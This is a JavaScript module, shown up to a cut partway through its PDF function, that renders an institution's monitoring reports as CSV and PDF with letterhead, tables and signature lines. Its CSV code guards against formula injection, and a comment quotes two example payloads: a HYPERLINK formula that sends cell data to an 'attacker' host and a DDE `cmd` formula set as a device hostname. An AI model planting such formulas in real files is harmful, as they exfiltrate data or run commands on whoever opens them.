import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import PDFDocument from "pdfkit";
import * as fontkit from "fontkit";
import { paperDimensions, formatPH, signatoriesPerRow } from "./reportTemplate.js";
import { drawChart, chartHeight } from "./reportChart.js";

// ─── Body font ───────────────────────────────────────────────────────────────
// ICTU asked for Arial 11/12. Arimo is metrically IDENTICAL to Arial (verified: a
// 46-char string at 11pt measures 248.83pt in both) and is OFL-licensed, so it can
// actually ship in this repo — Arial cannot. See assets/fonts/README.md for the
// licensing reasoning and the measurements.
const FONTS = path.join(path.dirname(fileURLToPath(import.meta.url)), "../assets/fonts");
const FONT_FILES = {
  regular: path.join(FONTS, "Arimo-Regular.ttf"),
  bold: path.join(FONTS, "Arimo-Bold.ttf"),
};

// Registered names used throughout. They resolve to Arimo when the files are present
// and to pdfkit's built-ins otherwise, so a deployment that lost assets/fonts/ still
// produces a report — in Helvetica, which is what it produced before this existed.
const BODY = "Body";
const BODY_BOLD = "Body-Bold";
const haveBodyFont = fs.existsSync(FONT_FILES.regular) && fs.existsSync(FONT_FILES.bold);
const F = haveBodyFont
  ? { reg: BODY, bold: BODY_BOLD }
  : { reg: "Helvetica", bold: "Helvetica-Bold" };

// The embedded font is the authority on what can be DRAWN, so open it once here for
// the coverage test in renderable(). Opened directly rather than reached through
// pdfkit's internals, which are private and change between releases.
let bodyGlyphs = null;
if (haveBodyFont) {
  try {
    bodyGlyphs = fontkit.openSync(FONT_FILES.regular);
  } catch (err) {
    console.error("[REPORTS] body font unreadable, falling back to Helvetica:", err.message);
  }
}

function registerBodyFont(doc) {
  if (!haveBodyFont) return;
  try {
    doc.registerFont(BODY, FONT_FILES.regular);
    doc.registerFont(BODY_BOLD, FONT_FILES.bold);
  } catch (err) {
    // Never fail a report over a font. build() is fire-and-forget, so a throw here
    // would flip the row to `failed` with nothing on screen explaining why.
    console.error("[REPORTS] could not register body font:", err.message);
  }
}

// Letterhead marks are RESOLVED BY THE CALLER and arrive as absolute paths on
// `report.branding`. They used to be read from a fixed folder beside this module,
// which made the logo a thing only someone with repo access could change — and ICTU
// asked for it to be theirs ("what if they change logo"). reportBrandingService now
// decides which file is live (an admin upload, else the bundled default); this module
// only draws whatever it is handed, which keeps it store-agnostic in the same way it
// already is about where the numbers came from.

// Turns a normalized report object into the two downloadable formats (CSV + PDF).
// A "report" here is store-agnostic — reportService builds it from InfluxDB/MySQL,
// this module only knows how to lay it out. Shape:
//   { title, type, periodStart, periodEnd, generatedAt,
//     summary: [{ label, value }], table: { columns: [...], rows: [[...]] } }
//
// A report may instead carry `tables: [{ title, columns, rows }]` when one flat
// table can't say it — the network report needs a per-device roll-up AND a
// per-interface breakdown. `table` stays supported and renders as a single
// "Details" section, so the older builders are untouched.

// Normalize either shape into an array of titled sections.
function sections(report) {
  if (report.tables?.length) {
    return report.tables.map((t, i) => ({
      title: t.title || (i === 0 ? "Details" : `Details ${i + 1}`),
      columns: t.columns ?? [],
      rows: t.rows ?? [],
    }));
  }
  return [{ title: "Details", columns: report.table?.columns ?? [], rows: report.table?.rows ?? [] }];
}

// Every timestamp in a generated report is PHILIPPINE time.
//
// ICTU asked for local time, not UTC. Nothing upstream changed: InfluxDB points and
// MySQL rows are still stored in UTC, and this converts at the last possible moment,
// for a document a person reads. The " PHT" suffix is load-bearing rather than
// decorative — the same report gets read beside a dashboard rendering in the viewer's
// own locale, and an untagged timestamp gives nobody a way to tell them apart.
const fmtTs = formatPH;

// A report's identity block: the labelled lines under the title. Built by
// reportService (which knows the reference number, the operator and the device) and
// rendered verbatim here, so adding a field never means touching the layout.
function metaRows(report) {
  if (Array.isArray(report.meta) && report.meta.length) {
    return report.meta.filter((m) => m && m.label);
  }
  // Fallback for any caller that predates `meta`. Keeps this module renderable on
  // its own — the report tests build objects by hand.
  return [
    { label: "Type", value: report.type },
    { label: "Monitoring Period", value: `${fmtTs(report.periodStart)}  to  ${fmtTs(report.periodEnd)}` },
    { label: "Date and Time Created", value: fmtTs(report.generatedAt) },
  ];
}

// ─── CSV ──────────────────────────────────────────────────────────────────────
// A cell whose text starts with one of these is executed as a FORMULA by Excel,
// LibreOffice and Google Sheets when the file is opened.
const FORMULA_START = /^[=+\-@\t\r]/;

// ─── CSV formula injection (CWE-1236) ─────────────────────────────────────────
//
// RFC 4180 quoting — the `/[",\n\r]/` test below — makes a cell PARSE correctly. It does
// nothing about what a spreadsheet DOES with the parsed text: a cell reading
// `=HYPERLINK("http://attacker/?"&A1,"Open")` is a live formula the moment someone opens
// the download, and it can read other cells and send them somewhere.
//
// That text is reachable. A report `title` comes from the request body
// (`POST /api/reports`), and device names come from `devices.device_name`, which
// `agentService.register` fills straight from the **agent-supplied hostname** with no
// character validation. So a machine enrolling itself as `=cmd|'/c calc'!A1` plants a
// formula that fires later, on an ICTU staffer's PC, when someone exports a report —
// the classic stored/deferred shape, in a file the feature exists to hand around.
//
// Prefixing with an apostrophe is the standard neutralisation: spreadsheets treat the
// rest as literal text and hide the quote.
//
// ⚠️ Numbers are deliberately exempt. `-12.5` starts with `-`, and prefixing it would turn
// a real measurement into a text cell — every negative value in the sheet would stop being
// summable. `Number.isFinite(Number(s))` keeps numeric columns numeric while still
// catching a lone `-` or `=1+1`, both of which are NaN.
function csvCell(v) {
  const s = v === null || v === undefined ? "" : String(v);
  const guarded = FORMULA_START.test(s) && !Number.isFinite(Number(s)) ? `'${s}` : s;
  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}
function csvRow(arr) {
  return arr.map(csvCell).join(",");
}

export function toCSV(report) {
  const lines = [];
  // The CSV carries the SAME identity block as the PDF, in the same order. The two
  // files are one report in two formats — a spreadsheet that omitted the reference
  // number or the operator would be the copy people quote from precisely because it
  // is easier to open, and it would be the copy that could not be traced.
  if (report.referenceNo) lines.push(csvRow(["Reference No.", report.referenceNo]));
  lines.push(csvRow(["Title", report.title]));
  for (const m of metaRows(report)) lines.push(csvRow([m.label, m.value]));
  // A spreadsheet has no signature block, so any name the PDF prints on one is carried
  // here as a field. Without this the CSV — the copy people quote from, because it opens
  // easier — would be the one that names nobody. Unnamed lines are skipped: a row
  // reading "Approved by," with nothing after it says less than no row at all.
  for (const s of report.signatories ?? []) {
    if (s?.name) lines.push(csvRow([String(s.role).replace(/:$/, ""), s.name]));
  }
  lines.push("");

  if (report.summary?.length) {
    lines.push("Summary");
    for (const s of report.summary) lines.push(csvRow([s.label, s.value]));
    lines.push("");
  }

  const secs = sections(report).filter((s) => s.columns.length);
  // Same mark the PDF stamps on every page, so a spreadsheet detached from it still
  // says the figures came from a system rather than from someone's typing.
  lines.push(csvRow(["System Generated Report", ""]));
  lines.push("");

  if (secs.length) {
    secs.forEach((s, i) => {
      if (i > 0) lines.push("");
      // Only label the block when there's more than one — a single table reads
      // cleaner in Excel without a stray title row above the header.
      if (secs.length > 1) lines.push(csvRow([s.title]));
      lines.push(csvRow(s.columns));
      for (const r of s.rows) lines.push(csvRow(r));
      if (!s.rows.length) lines.push(csvRow(["No data for the selected period."]));
    });
  } else {
    lines.push(csvRow(["No data for the selected period."]));
  }

  return lines.join("\r\n");
}

// ─── PDF ──────────────────────────────────────────────────────────────────────
const INK = "#1a1d23";
const MUTED = "#6B7280";
const ROW_ALT = "#f3f4f6";
const BORDER = "#d1d5db";

// CSPC's institutional blue — "Madison". The ONE blue in a generated report: the
// letterhead rule and every table header are drawn in it.
//
// Deliberately a single constant. Sampling the seal in the letterhead image gives
// #002878, and the table header used to be a generic #2563EB, so a document could carry
// three different blues — which reads as an accident rather than as branding. The brand
// value wins over the sampled one: a scanned JPEG's ink is a measurement of that scan,
// not of the institution's colour.
const CSPC_BLUE = "#0F2E66";

// ─── Type sizes ──────────────────────────────────────────────────────────────
// ICTU asked for Arial 11/12 (reports-client-questionnaire.md). That is a BODY-TEXT
// instruction, and it is applied literally to every piece of prose in the document:
// the identity block, the summary, the signature block. It cannot be applied to a
// nine-column data grid on a portrait page — measured, those columns need 617pt of a
// 532pt printable width at 11pt — so drawTable fits each table independently instead,
// starting from 11 and dropping only as far as that particular table requires.
const BODY_PT = 11;
// Letterhead unit line. Always one line, shrinking within these bounds to fit the width
// beside the logos — the floor is where the masthead stops out-ranking the college name
// above it, not where it becomes unreadable.
const UNIT_MAX_PT = 15;
const UNIT_MIN_PT = 9;
const HEADING_PT = 12.5;
const CSPC_BLACK = "#000000";

// Text reaching a PDF must be limited to what the chosen font can actually DRAW.
//
// This began as a WinAnsi fold, because pdfkit's built-in fonts are single-byte: hand
// one a codepoint outside that set and it does not throw, it writes the bytes raw, so
// "→" left the Period line reading "!’" in every report ever generated. Report titles
// and device names are user-typed and reach this file verbatim, so one pasted character
// could do the same again at any time.
//
// Embedding Arimo did NOT make the problem go away, it moved it. The file shipped here
// is the gstatic latin subset: full ASCII and full Latin-1 (so accented names now render
// properly, which WinAnsi also allowed), but NO arrows or maths symbols — measured
// coverage is in assets/fonts/README.md. A naive "we have a real TrueType font now, drop
// the guard" would have silently replaced every "→" with a blank box.
//
// So the test is now the FONT's own glyph table rather than a hardcoded encoding. Swap
// in a fuller cut and more characters survive automatically, with no code change.
const CP1252_EXTRA = "€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ";
const TRANSLIT = {
  "→": "->", "←": "<-", "↔": "<->", "≤": "<=", "≥": ">=",
  "≠": "!=", "≈": "~", "✓": "Y", "✗": "N", "′": "'", "″": '"',
};

/** Can the body font draw this codepoint? Falls back to the WinAnsi rule when no
 *  embedded font is available, since pdfkit is then using a built-in. */
function drawable(cp) {
  if (bodyGlyphs) return bodyGlyphs.hasGlyphForCodePoint(cp);
  return cp <= 0xff || CP1252_EXTRA.includes(String.fromCodePoint(cp));
}

/** Text safe to hand the body font: pass it through, transliterate it to something
 *  honest, or "?" — a visible gap beats a glyph that silently reads as different text. */
function renderable(v) {
  const str = v === null || v === undefined ? "" : String(v);
  let out = "";
  for (const ch of str) {
    if (drawable(ch.codePointAt(0))) {
      out += ch;
      continue;
    }
    const sub = TRANSLIT[ch];
    // Only accept a transliteration the font can itself draw, or we would swap one
    // missing glyph for another.
    out += sub && [...sub].every((c) => drawable(c.codePointAt(0))) ? sub : "?";
  }
  return out;
}

/** The letterhead is set in pdfkit's built-in Times, which is strictly WinAnsi — so
 *  institutional text and the configurable unit name take the narrower rule. */
function latin1(v) {
  const str = v === null || v === undefined ? "" : String(v);
  let out = "";
  for (const ch of str) {
    out += ch.codePointAt(0) <= 0xff || CP1252_EXTRA.includes(ch) ? ch : (TRANSLIT[ch] ?? "?");
  }
  return out;
}


// Measuring every row of a long table at every candidate size is O(rows x cols x sizes).
// An alert-history report can carry hundreds of rows, so width sampling is capped —
// column widths are a layout decision, and 200 rows determine it as well as 2000 do.
const WIDTH_SAMPLE_ROWS = 200;

/** Width each column needs at `size`: its header, or its widest sampled cell. */
function measureColumns(doc, columns, rows, size, padX) {
  const step = Math.max(1, Math.ceil(rows.length / WIDTH_SAMPLE_ROWS));
  return columns.map((c, i) => {
    doc.font(F.bold).fontSize(size);
    let w = doc.widthOfString(renderable(c));
    doc.font(F.reg).fontSize(size);
    for (let r = 0; r < rows.length; r += step) {
      const cell = rows[r]?.[i];
      const cw = doc.widthOfString(renderable(cell === null || cell === undefined ? "" : String(cell)));
      if (cw > w) w = cw;
    }
    return w + padX * 2;
  });
}

// ICTU asked for Arial 11/12. That is a BODY-TEXT instruction — no institutional
// template sets a nine-column data grid at 12pt, and on a portrait folio it does not
// physically fit. Measured natural widths at 11pt against a 532pt printable folio:
//
//   environment (6 cols)      442pt   fits
//   availability (5 cols)     294pt   fits
//   alerts (6 cols)           479pt   fits
//   aircon (6 cols)           527pt   fits — until one long "Reason" pushes it over
//   resource util (9 cols)    603pt   does NOT fit
//   network devices (12 cols) 729pt   does NOT fit
//   ups gauges (9 cols)       796pt   does NOT fit
//
// So tables start at 11 and step down only as far as THEIR OWN content requires. A
// five-column table gets the full 11pt; the nine-column Resource Utilization drops to
// about 9.5. Sizing every table by the worst one would shrink the readable tables for
// nothing.
//
// ⚠️ A HEADER IS NEVER TRUNCATED. That is the rule the whole layout is built around.
//
// First attempt held 11pt by squeezing every column toward a flat 30pt floor and
// wrapping. It broke headers: wrapping only breaks at whitespace, so "Trigger" — one
// token, no spaces — had nowhere to break and came out as "Tri…". A column whose
// heading is unreadable is worse than one set two points smaller, because the heading is
// what makes the numbers mean anything.
//
// The floor is now PER COLUMN and equals that header's widest unbreakable TOKEN. A
// multi-word header ("Avg Charge %") may wrap onto two lines; a single-word header
// ("Trigger") sets a floor equal to its own full width and can never be squeezed at all.
//
// Measured against a 532pt printable folio, that floor lets EVERY table sit at 11pt:
//
//   table                  full headers   token floor
//   resource util (9)          601pt         299pt
//   ups gauges (9)             661pt         395pt
//   ups voltages (9)           577pt         368pt
//   network devices (12)       619pt         399pt
//   aircon (6)                 220pt         220pt   (all single words — no squeeze)
//
// The size also no longer depends on a table's DATA. It used to be driven by the widest
// cell, which is why one long aircon "Reason" shrank that whole report while a server
// report stayed large, and why the same report could come out at different sizes on
// different days.
const TABLE_MAX_PT = 11;
const TABLE_MIN_PT = 7.5;


/**
 * The narrowest a column may become: the widest unbreakable TOKEN anywhere in it —
 * its header, or any of its values.
 *
 * Text wraps at whitespace, so a column at least this wide can always show every word
 * whole; it only ever costs extra LINES, never a cut-off word. "Huawei Router
 * (ISP-owned)" needs room for "(ISP-owned)", not for the whole phrase.
 *
 * Header AND cells, because the requirement is that every VALUE reads completely, not
 * just every heading.
 */
function columnFloor(doc, header, rows, index, size, padX) {
  doc.font(F.bold).fontSize(size);
  const headerTokens = renderable(header).split(/\s+/).filter(Boolean);
  let widest = headerTokens.length ? Math.max(...headerTokens.map((t) => doc.widthOfString(t))) : 0;

  doc.font(F.reg).fontSize(size);
  const step = Math.max(1, Math.ceil(rows.length / WIDTH_SAMPLE_ROWS));
  for (let r = 0; r < rows.length; r += step) {
    const cell = rows[r]?.[index];
    const text = renderable(cell === null || cell === undefined ? "" : String(cell));
    for (const t of text.split(/\s+/)) {
      if (t) widest = Math.max(widest, doc.widthOfString(t));
    }
  }
  return widest + padX * 2;
}

/**
 * Shorten one token to fit `width`. A last resort only: it runs when a column is still
 * narrower than its widest word at the smallest permitted type size.
 */
function clipToken(doc, token, width) {
  let t = token;
  while (t.length > 1 && doc.widthOfString(`${t}…`) > width) t = t.slice(0, -1);
  return `${t}…`;
}

/** Text safe to wrap in `width` — untouched unless some single word cannot fit. */
function wrapSafe(doc, value, width) {
  const s = renderable(value === null || value === undefined ? "" : String(value));
  if (doc.widthOfString(s) <= width) return s;
  return s
    .split(/(\s+)/)
    .map((t) => (/^\s*$/.test(t) || doc.widthOfString(t) <= width ? t : clipToken(doc, t, width)))
    .join("");
}

function drawTable(doc, columns, rows) {
  const left = doc.page.margins.left;
  const right = doc.page.width - doc.page.margins.right;
  const totalW = right - left;
  const padX = 4;
  const padY = 3;

  // ── Size ──
  // The largest size at which every column can still be at least as wide as its widest
  // WORD — heading or value. At that width nothing is ever cut mid-word; long text
  // simply takes more lines.
  let size = TABLE_MIN_PT;
  for (let s = TABLE_MAX_PT; s >= TABLE_MIN_PT; s -= 0.5) {
    const floorSum = columns.reduce((a, c, i) => a + columnFloor(doc, c, rows, i, s, padX), 0);
    if (floorSum <= totalW) {
      size = s;
      break;
    }
  }

  const floors = columns.map((c, i) => columnFloor(doc, c, rows, i, size, padX));

  // ── Widths ──
  // Natural = what the column would like: its full header, or its widest cell.
  // Proportional, never equal slices — equal slices gave "Incidents" the same room as a
  // server name, so the name truncated while a one-digit number sat in white space.
  const natural = measureColumns(doc, columns, rows, size, padX);
  const need = natural.reduce((a, b) => a + b, 0);
  let widths;

  if (need <= totalW) {
    // Spare width goes to the columns that can use it, in proportion to what they
    // already occupy — so a long device name gets the slack, not a number column.
    const slack = totalW - need;
    widths = natural.map((w) => w + (slack * w) / need);
  } else {
    // Over budget: every column keeps its floor and gives up the SAME FRACTION of what
    // it wanted beyond it. Solved directly rather than iterated — one k satisfies the
    // total exactly, and no column can be pushed under its floor.
    const floorSum = floors.reduce((a, b) => a + b, 0);
    const flexSum = need - floorSum;
    const k = flexSum > 0 ? Math.max(0, (totalW - floorSum) / flexSum) : 0;
    widths = natural.map((w, i) => floors[i] + (w - floors[i]) * k);
  }

  const xs = [];
  let acc = left;
  for (const w of widths) {
    xs.push(acc);
    acc += w;
  }
  const inner = widths.map((w) => w - padX * 2);

  // ── Header ──
  // Wrapped, NEVER truncated: the column is at least as wide as its widest token, so
  // every word fits. Height follows whatever wrapping it needed.
  doc.font(F.bold).fontSize(size);
  const headerText = columns.map((c) => renderable(c));
  const headerH =
    Math.max(...headerText.map((c, i) => doc.heightOfString(c, { width: inner[i] }))) + padY * 2;

  const bottom = doc.page.height - doc.page.margins.bottom;
  // A footer is stamped at the foot of every page, so rows stop above it.
  const FOOTER_RESERVE = 26;
  const MIN_ROW_H = Math.round(size * 2.1);

  const header = (y) => {
    doc.rect(left, y, totalW, headerH).fill(CSPC_BLUE);
    doc.fillColor("#ffffff").font(F.bold).fontSize(size);
    headerText.forEach((c, i) => {
      doc.text(c, xs[i] + padX, y + padY, { width: inner[i] });
    });
    return y + headerH;
  };

  let y = header(doc.y);
  doc.font(F.reg).fontSize(size);

  rows.forEach((row, ri) => {
    doc.font(F.reg).fontSize(size);
    // Cells WRAP rather than truncate: every column is at least as wide as its widest
    // word, so a long value costs extra lines and never a cut-off name. A row is as
    // tall as its tallest cell.
    const cells = columns.map((_, ci) => wrapSafe(doc, row[ci], inner[ci]));
    let rowH =
      Math.max(MIN_ROW_H, ...cells.map((c, ci) => doc.heightOfString(c, { width: inner[ci] }) + padY * 2));
    // A single row taller than the page would never fit and would loop forever adding
    // pages. Clamp it and let that one cell clip instead.
    rowH = Math.min(rowH, bottom - doc.page.margins.top - headerH - FOOTER_RESERVE);

    if (y + rowH > bottom - FOOTER_RESERVE) {
      doc.addPage();
      y = header(doc.page.margins.top);
      doc.font(F.reg).fontSize(size);
    }
    if (ri % 2 === 1) doc.rect(left, y, totalW, rowH).fill(ROW_ALT);
    doc.fillColor(INK).font(F.reg).fontSize(size);
    cells.forEach((c, ci) => {
      // Top-aligned. With cells of differing heights, centring each independently would
      // leave one row's values sitting at several different baselines.
      doc.text(c, xs[ci] + padX, y + padY, { width: inner[ci], height: rowH - padY * 2 });
    });
    y += rowH;
  });

  // Leave the cursor just below the last row. drawTable positions every cell
  // absolutely, so pdfkit's own doc.y is meaningless by now — a second table (or
  // anything after it) would otherwise be drawn straight over this one.
  doc.x = left;
  doc.y = y;
  doc.lineWidth(0.5).strokeColor(BORDER);
}

// doc.image() THROWS on a missing or unreadable file, and reportService.build()
// is fire-and-forget — an exception here flips the report to `failed` with nothing
// on the page to say why. A logo that will not load must cost us the logo, never
// the report, so this reports failure instead of raising it.
function drawLogo(doc, abs, x, y, size) {
  try {
    if (!abs || !fs.existsSync(abs)) return false;
    // `fit` scales inside a square box and preserves aspect ratio — the two marks
    // are not identically proportioned and must not be stretched to match.
    doc.image(abs, x, y, { fit: [size, size], align: "center", valign: "center" });
    return true;
  } catch {
    return false;
  }
}

// ─── Signatories ──────────────────────────────────────────────────────────────
// THREE lines since 2026-08-28. ICTU was asked whether "Prepared by" and "Noted by"
// were the right lines and whether "Approved by" was also needed, and confirmed all
// three. The third is not cosmetic: prepared/noted/approved is the standard Philippine
// government document chain, and a report filed for accreditation without the approving
// signature is a document that has not actually been approved by anyone.
//
// ⚠️ Only "Prepared by" is ever NAMED, and only from `report.preparedBy` — the person
// who generated the document, which the system actually knows. "Noted by" and "Approved
// by" stay blank because nobody has noted or approved anything at the moment a PDF is
// written: printing a name on those lines would assert an approval that has not happened,
// on a document filed for accreditation.
//
// ICTU's own questionnaire allowed for this — "names may either be automatically printed
// or left blank for manual signature" — and it replaces the duplicated "Responsible"
// field that previously sat in the identity block saying the same thing.
//
// Still never a signature IMAGE. A printed name under a rule is the standard
// "signature over printed name" form and the human still signs it; embedding a scanned
// signature would let anyone who can click Generate produce a document already bearing
// someone's mark.
// Height of one signature column, and of one row of them.
const SIG_BLOCK_H = 92;
const SIG_ROW_GAP = 14;

/**
 * @param {PDFKit.PDFDocument} doc
 * @param {{role: string, name: string}[]} signatories already resolved by reportTemplate
 */
function drawSignatories(doc, signatories) {
  const list = Array.isArray(signatories) && signatories.length ? signatories : [];
  if (!list.length) return;

  const left = doc.page.margins.left;
  const right = doc.page.width - doc.page.margins.right;
  const perRow = signatoriesPerRow(list.length);
  const rowCount = Math.ceil(list.length / perRow);

  // Keep the block whole. A role label stranded at the foot of a page with its rule
  // overleaf is worse than ending the tables early and leaving white space.
  const needed = rowCount * SIG_BLOCK_H + (rowCount - 1) * SIG_ROW_GAP + 24;
  if (doc.y + needed > doc.page.height - doc.page.margins.bottom) doc.addPage();

  const colW = (right - left) / perRow;
  const ruleW = Math.min(230, colW - 24);
  const top = doc.y + 24;

  list.forEach((s, i) => {
    const row = Math.floor(i / perRow);
    const col = i % perRow;
    const x = left + col * colW;
    const y0 = top + row * (SIG_BLOCK_H + SIG_ROW_GAP);

    doc.fillColor(MUTED).font(F.reg).fontSize(BODY_PT)
      .text(renderable(s.role), x, y0, { width: colW, lineBreak: false });

    // ~50pt of clear air below the role — a hand needs room to sign.
    const ruleY = y0 + 50;

    // ── The printed name sits ABOVE the rule ──
    // ICTU's format: the name is printed and the signature goes across it, so the rule
    // closes the block underneath rather than carrying the name below it.
    //
    // Upper-cased, the convention for a printed name in a Philippine signature block.
    // Shrinks to fit rather than wrapping — a name broken over two lines would push
    // into the role label above it.
    const name = renderable(s.name ?? "").trim().toUpperCase();
    if (name) {
      doc.font(F.bold);
      let nameSize = 10;
      while (nameSize > 6.5) {
        doc.fontSize(nameSize);
        if (doc.widthOfString(name) <= ruleW) break;
        nameSize -= 0.25;
      }
      doc.fillColor(INK).fontSize(nameSize)
        .text(name, x, ruleY - nameSize - 3, { width: ruleW, align: "center", lineBreak: false });
      doc.font(F.reg);
    }

    doc.moveTo(x, ruleY).lineTo(x + ruleW, ruleY).lineWidth(0.75).strokeColor(INK).stroke();

    doc.fillColor(MUTED).font(F.reg).fontSize(8.5)
      .text("Signature over printed name", x, ruleY + 4, {
        width: ruleW, align: "center", lineBreak: false,
      });

    doc.fillColor(MUTED).fontSize(BODY_PT).text("Date:", x, ruleY + 20, { lineBreak: false });
    const dateX = x + doc.widthOfString("Date:  ");
    doc.moveTo(dateX, ruleY + 28).lineTo(x + ruleW, ruleY + 28).lineWidth(0.75)
      .strokeColor(INK).stroke();
  });

  doc.x = left;
  doc.y = top + rowCount * SIG_BLOCK_H + (rowCount - 1) * SIG_ROW_GAP;
}

/**
 * The "System Generated Report" mark, on EVERY page.
 *
 * ICTU's own phrase — they wrote it on the questionnaire beside the timezone question.
 * It matters on a document that carries signature lines: a reader has to be able to tell
 * that the FIGURES were produced by a system and only the signatures are human. The
 * control number rides along because a filed multi-page document should identify itself
 * on every sheet, not only the one with the letterhead.
 *
 * Drawn after all content via bufferPages, which is the only way to know the page COUNT
 * — "Page 1 of 3" cannot be written before page 3 exists.
 *
 * ⚠️ The bottom margin is temporarily zeroed. pdfkit starts a NEW PAGE when text would
 * cross into the bottom margin, so writing a footer there without this would add a blank
 * page per page, forever.
 */
function drawPageFooters(doc, report) {
  const range = doc.bufferedPageRange();
  const total = range.count;

  for (let i = 0; i < total; i++) {
    doc.switchToPage(range.start + i);

    const savedBottom = doc.page.margins.bottom;
    doc.page.margins.bottom = 0;

    const left = doc.page.margins.left;
    const right = doc.page.width - doc.page.margins.right;
    const y = doc.page.height - 30;

    doc.moveTo(left, y - 6).lineTo(right, y - 6).lineWidth(0.5).strokeColor(BORDER).stroke();

    const mark = report.referenceNo
      ? `System Generated Report  ·  ${report.referenceNo}`
      : "System Generated Report";
    doc.fillColor(MUTED).font(F.reg).fontSize(8)
      .text(renderable(mark), left, y, { width: right - left, lineBreak: false });
    doc.text(`Page ${i + 1} of ${total}`, left, y, {
      width: right - left, align: "right", lineBreak: false,
    });

    doc.page.margins.bottom = savedBottom;
  }
}

export function toPDFBuffer(report) {
  return new Promise((resolve, reject) => {
    // Page size is per-report, not a constant. ICTU answered "Dynamic (long -
    // default)": an admin picks, and the default is Folio/long bond — what CSPC
    // actually prints on. The size is frozen onto the report row at generate time, so
    // re-downloading an old report gives back the page it was filed as even after the
    // default changes. Given as explicit points rather than a pdfkit size name because
    // Folio has no name in pdfkit's table.
    // bufferPages so drawPageFooters can revisit every page once the total is known —
    // "Page 1 of 3" cannot be written before page 3 exists.
    const doc = new PDFDocument({ size: paperDimensions(report.paperSize), margin: 40, bufferPages: true });
    const chunks = [];
    doc.on("data", (c) => chunks.push(c));
    doc.on("end", () => resolve(Buffer.concat(chunks)));
    doc.on("error", reject);

    // Must happen before anything is drawn — F.reg/F.bold name these.
    registerBodyFont(doc);

    // ── Letterhead ──
    //
    // Reproduces CSPC's official letterhead, measured from the sample ICTU supplied
    // (reports_template/sample_reports_header.png). This replaced our own invented
    // arrangement — a centred wordmark between two far-apart logos — which looked
    // nothing like the institution's real stationery.
    //
    // The measured structure:
    //   · both marks LEFT, side by side (not one at each margin)
    //   · a LEFT-ALIGNED serif text block beside them, four small lines then one large
    //   · a 2pt rule beneath, GOLD #FFC000 for the first 70.5% of the width and BLACK
    //     for the remainder — the detail that makes it read as CSPC's at a glance
    //
    // Set in Times, not the body font: the sample letterhead is a serif and the
    // institutional identity should not change when the body font does. Times is a
    // pdfkit built-in, so this costs no extra font file.
    const left = doc.page.margins.left;
    const right = doc.page.width - doc.page.margins.right;
    const width = right - left;
    const top = 30;

    // Sized from the sample, where the marks occupy roughly four-fifths of the
    // letterhead's height. They carry the institutional identity, so they are the one
    // element worth the vertical space.
    const LOGO = 62;
    const LOGO_GAP = 8;

    const branding = report.branding ?? {};
    const hasCspc = drawLogo(doc, branding.cspc, left, top, LOGO);
    // Second mark sits immediately beside the first. In the sample this is the College
    // shield; here it is ICTU's, since these are ICTU's reports.
    const ictuX = left + (hasCspc ? LOGO + LOGO_GAP : 0);
    const hasIctu = drawLogo(doc, branding.ictu, ictuX, top, LOGO);

    // Text starts after whichever marks actually drew, so a missing logo closes its
    // own gap instead of leaving a hole in the middle of the letterhead.
    const marks = (hasCspc ? LOGO + LOGO_GAP : 0) + (hasIctu ? LOGO + LOGO_GAP : 0);
    const tx = left + marks + (marks ? 14 : 0);
    const tw = right - tx;

    // ── The unit line ──
    // Configurable (settings `report.unit_name`) rather than hardcoded: the sample
    // carries "COLLEGE of COMPUTER STUDIES", an ICTU report should carry ICTU, and
    // whoever files these next may be neither.
    //
    // Sized BEFORE anything is drawn, because the block's height decides where it sits.
    //
    // ⚠️ ALWAYS ONE LINE. It briefly wrapped to two so a long name could keep a bigger
    // size, but a letterhead's unit line is a single line in every institutional
    // template — two made the block look like a paragraph rather than a masthead.
    //
    // So the type shrinks until it fits instead. ICTU's own name is far longer than the
    // sample's "COLLEGE of COMPUTER STUDIES" and lands at 12pt; a short unit keeps the
    // full 15. Twelve is still above the 11pt college line, so the hierarchy survives —
    // narrowly, which is the cost of the one-line rule and worth knowing about.
    const unit = latin1(report.unitName || "INFORMATION AND COMMUNICATIONS TECHNOLOGY UNIT");
    doc.font("Times-Bold");
    let unitSize = UNIT_MIN_PT;
    for (let s = UNIT_MAX_PT; s >= UNIT_MIN_PT; s -= 0.25) {
      doc.fontSize(s);
      if (doc.widthOfString(unit) <= tw) { unitSize = s; break; }
    }
    doc.fontSize(unitSize);
    const unitH = unitSize;

    // Vertically centre the whole text block against the marks, measured rather than
    // assumed — the block's height moves with the unit line's size and line count.
    const SMALL_H = 8.5 + 11 + 8.5 + 7.5 + 8; // four small lines plus their leading
    let ty = top + Math.max(0, (LOGO - (SMALL_H + unitH)) / 2);

    const line = (text, font, size, gap = 0) => {
      doc.fillColor(INK).font(font).fontSize(size)
        .text(latin1(text), tx, ty, { width: tw, lineBreak: false });
      ty = doc.y + gap;
    };

    line("Republic of the Philippines", "Times-Roman", 8.5);
    line("Camarines Sur Polytechnic Colleges", "Times-Bold", 11);
    line("Nabua, Camarines Sur", "Times-Roman", 8.5);
    line("ISO 9001:2015 Certified", "Times-Italic", 7.5, 2);

    // lineBreak:false so it can never wrap even if a name defeats the floor size —
    // it would be clipped at the margin rather than silently becoming two lines.
    doc.fillColor(INK).font("Times-Bold").fontSize(unitSize)
      .text(unit, tx, ty, { width: tw, lineBreak: false });

    // ── The two-tone rule ──
    // Blue to 70.5% of the width, then black. The split point is measured off the
    // sample, not guessed.
    const ruleY = Math.max(top + LOGO, doc.y) + 8;
    const split = left + width * 0.705;
    // 3pt, not 2. Same #0F2E66 as the table headers, but a 2pt hairline of a dark navy
    // antialiases toward grey and reads as a different, weaker colour than the solid
    // band below it. The extra point is what makes the two register as one blue.
    doc.moveTo(left, ruleY).lineTo(split, ruleY).lineWidth(3).strokeColor(CSPC_BLUE).stroke();
    doc.moveTo(split, ruleY).lineTo(right, ruleY).lineWidth(3).strokeColor(CSPC_BLACK).stroke();

    // ── Report identity ──
    // Absolute positioning above left pdfkit's cursor wherever the last string
    // ended, so both axes are reset before the flowing content resumes.
    doc.x = left;
    doc.y = ruleY + 13;

    // The control number sits ABOVE the title and hard right, where a filed document
    // is read from. ICTU called it "advisable to have"; its whole purpose is to be
    // findable on a page in a folder, which a line buried among the metadata is not.
    if (report.referenceNo) {
      const titleTop = doc.y;
      doc.fillColor(MUTED).font(F.reg).fontSize(10)
        .text(renderable(report.referenceNo), left, titleTop, {
          width: right - left, align: "right", lineBreak: false,
        });
      doc.x = left;
      doc.y = titleTop + 12;
    }

